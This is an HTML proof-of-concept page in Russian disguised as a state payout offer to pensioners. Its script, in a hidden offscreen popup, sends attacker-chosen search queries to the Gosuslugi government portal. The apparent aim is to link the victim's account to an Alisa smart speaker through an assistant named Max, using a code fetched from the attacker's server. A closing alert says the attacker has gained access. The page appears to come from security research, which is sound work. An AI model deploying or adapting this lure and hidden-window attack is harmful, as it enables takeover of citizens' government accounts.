<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <style>
        div{
            padding: 16px;
            display: flex;
        }

        .column{
            flex-direction: column;
        }
        button {
            margin: 8px;
            display: flex;
            padding: 8px;
            cursor: pointer;
            width: 50%;
        }
        input{
            padding: 8px;
            width: 50%;
            margin: 8px;
        }
        span{
            color: gray;
            font-size: 12px;
            margin: 8px;
        }
    </style>

    <script>
        let openedWindow;
        let closeTimeout;
        async function poc (payload) {
            clearTimeout(closeTimeout);
            let url = `https://www.gosuslugi.ru/newsearch?query=${encodeURI(payload)}`;
            if (openedWindow) {
                openedWindow.location.href = url;
            } else {
                openedWindow = window.open(url, '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', '');
            }


            return new Promise((resolve) => {
                setTimeout(() => {
                    resolve();
                }, 2000);
                closeTimeout = setTimeout(() => {
                    openedWindow?.close();
                    openedWindow = null;
                }, 4000);
            })
        }
    </script>
</head>
<body>

<div>
    <h2>5000 рублей каждому пенсионеру из фонда Госуслуг</h2>
    <h3>При доходе семьи менее 75.000 рубей в месяц</h3>
    <div>
        <div>
            <object type="image/svg+xml" data="./one.svg" width="200" height="200" ></object>
            <object type="image/svg+xml" data="./max.svg" width="200" height="200" ></object>
        </div>
        <div>
            <button onclick="connectAlisa()" style="font-size: 40px">Оставить заявку через робота Макса</button>
        </div>
    </div>
    <script>
        let code;
        const response = fetch('/get-code').then(async response => {
            const responseJSON = await response.json();
            code = responseJSON.code;
            console.log('code!', code);
        })


        function connectAlisa() {
            const code = window.document.getElementById('alisaCode').value;
            poc(code);


            alert('Злоумышленник получил доступ к твоим госуслугам через интеграцию робота Макса в колонку Алиса')
        };
        async function fastDisconnectAlisa() {
            await poc('Алиса')
            await poc('Удалить связь')
            await poc('Да')
        }
    </script>

    <button onclick="fastDisconnectAlisa()">Попробуем заново?</button>
</div>






</body>
</html>
